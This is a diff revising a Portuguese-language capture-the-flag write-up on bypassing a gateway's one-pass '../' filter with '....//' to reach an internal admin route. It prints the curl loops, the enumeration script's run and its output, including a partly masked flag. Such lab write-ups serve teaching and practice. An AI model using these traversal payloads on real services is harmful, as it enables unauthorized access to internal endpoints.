@@ -41,7 +41,23 @@ Na minha instância era esse host. Use o da sua (o script lê `TARGET`).
 
 ## Resolução
 
-### 1. Revisão do código: a sanitização de uma passagem
+### 1. Extração dos arquivos
+
+O desafio entrega um `public.zip` (senha `infected`). `unzip` não abre o AES, então `7z`:
+
+***INSERIR no terminal: Kali (atacante)
+
+```bash
+7z x -pinfected -y public.zip -osrc && find src -maxdepth 4 -type f -name '*.py'
+```
+
+```text
+src/gateway.py
+```
+
+O `gateway.py` é o proxy público. É nele que está a sanitização falha.
+
+### 2. Revisão do código: a sanitização de uma passagem
 
 #### `src/gateway.py`
 
@@ -72,9 +88,66 @@ Pensando no `....//`: o Python avalia a substring `../` dentro dele e remove. Em
 
 Como o gateway encaminha para um backend HTTP interno, isso vira uma SSRF/traversal de rota: `http://127.0.0.1:5001/users/../admin/flag` é normalizado (pelo backend) para `/admin/flag`.
 
-### 2. Reconhecimento e exploração
+### 3. Reconhecimento: endpoints públicos e perfis
 
-Enumerei os endpoints públicos (baseline: `/api/users`, perfis de `alice`, `bob`, ...) e depois varri rotas internas prováveis atrás do `....//`. O script faz tudo: baseline, lista de candidatos internos (`flag`, `admin`, `admin/flag`, `debug`, `config`...) e variações URL-encoded. Script completo, idêntico ao arquivo em `scripts/`:
+Antes de atacar, confirmei o comportamento normal do proxy. Os perfis públicos existem e vêm do backend interno via `/users/<nome>`:
+
+***INSERIR no terminal: Kali (atacante)
+
+```bash
+for u in alice bob carol dave; do echo "== $u =="; curl -sk "https://$TARGET/api/profile/$u"; echo; done
+```
+
+```text
+== alice ==
+{"profile":{"bio":"Backend developer focused on distributed systems.","department":"Engineering","display_name":"Alice ..."}}
+== bob ==
+{"profile":{"bio":"UI/UX designer with a passion for accessibility.","department":"Product","display_name":"Bob ..."}}
+== carol ==
+{"profile":{"bio":"Engineering manager. Previously at Stripe and AWS.","department":"Engineering",...}}
+== dave ==
+{"profile":{"bio":"Application security engineer and CTF enthusiast.","department":"Security",...}}
+```
+
+Baseline estabelecido: `/api/profile/<nome>` -> `http://127.0.0.1:5001/users/<nome>`. Agora é escapar do prefixo `/users/`.
+
+### 4. Exploração: varrer rotas internas com `....//`
+
+Montei um enumerador (`script1.py`) que testa `/api/profile/....//<candidato>` para uma lista de rotas internas prováveis. Rodei primeiro apontando pro `http://` e tomei só erro de conexão:
+
+***INSERIR no terminal: Kali (atacante)
+
+```bash
+TARGET=77f39209681106af.chal.ctf.ae python3 scripts/script1.py
+```
+
+```text
+[PATH ] /api/profile/....//admin/flag
+HTTPConnectionPool(host='77f39209681106af.chal.ctf.ae', port=80): Max retries exceeded
+```
+
+**Isso não funcionou** (pule ao replicar): HTTP (porta 80) está morto. Repeti a varredura com `curl` em HTTPS e, importante, `--path-as-is`, para o `curl` não normalizar o `....//` antes de enviar:
+
+***INSERIR no terminal: Kali (atacante)
+
+```bash
+for p in flag admin admin/flag internal debug; do echo "== ....//$p =="; curl -sk --path-as-is "https://$TARGET/api/profile/....//$p"; echo; done
+```
+
+```text
+== ....//flag ==
+{"error":"User not found"}
+== ....//admin ==
+{"error":"User not found"}
+== ....//admin/flag ==
+{"flag":"flag{f3491c3cad7XXXXX}","message":"Internal admin access granted","status":"ok"}
+== ....//internal ==
+{"error":"User not found"}
+== ....//debug ==
+{"error":"User not found"}
+```
+
+A sequência conta a história: `....//flag` e `....//admin` dão 404 (essas rotas não existem no backend), mas `....//admin/flag` acerta `/admin/flag`. O `....//` virou `../`, o backend normalizou `/users/../admin/flag` para `/admin/flag` e devolveu a flag. Para automatizar essa varredura (e ter a extração da flag), o `script1.py` completo, idêntico ao arquivo em `scripts/`:
 
 #### `scripts/script1.py`
 
@@ -265,6 +338,8 @@ if __name__ == "__main__":
     main()
 ```
 
+Apontando o script pro HTTPS, ele percorre a lista de candidatos e para na `....//admin/flag`, imprimindo e salvando a flag:
+
 ***INSERIR no terminal: Kali (atacante)
 
 ```bash
@@ -272,27 +347,11 @@ python3 scripts/script1.py
 ```
 
 ```text
-===== /api/profile/....//flag =====
-HTTP/1.1 404 NOT FOUND
-{"error":"User not found"}
-
-===== /api/profile/....//admin/flag =====
-HTTP/1.1 200 OK
+[TESTE] traversal
+[PATH ] /api/profile/....//admin/flag
+[HTTP ] 200
 {"flag":"flag{f3491c3cad7XXXXX}","message":"Internal admin access granted","status":"ok"}
-```
-
-O caminho certo foi `....//admin/flag`. Repare que `....//flag` sozinho dá 404 (não existe `/flag` no backend), mas `....//users` devolve a lista (confirma que o `/users/../users` colapsa para `/users`), e `....//admin/flag` acerta a rota interna `/admin/flag`.
-
-O mesmo direto no `curl` (note que eu não deixo o `curl` normalizar o path, por isso o `....//` chega cru ao servidor):
-
-***INSERIR no terminal: Kali (atacante)
-
-```bash
-curl -sk "https://$TARGET/api/profile/....//admin/flag"
-```
-
-```text
-{"flag":"flag{f3491c3cad7XXXXX}","message":"Internal admin access granted","status":"ok"}
+[+] FLAG ENCONTRADA: flag{f3491c3cad7XXXXX}
 ```
 
 ## Cadeia de ataque
